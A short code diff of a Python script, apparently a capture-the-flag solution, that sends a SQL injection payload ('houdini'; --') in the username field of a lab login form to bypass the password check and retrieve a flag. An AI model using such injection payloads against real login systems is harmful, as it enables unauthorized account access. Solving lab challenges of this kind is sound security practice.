@@ -6,7 +6,7 @@ import re
 # for challenge that redirects to the correct instance.
 r = requests.post(
     "http://challenge:5000/login",
-    data={"username": "houdini'--", "password": "does not matter"},
+    data={"username": "houdini'; --", "password": "does not matter"},
 )
 
 # Extract the flag.
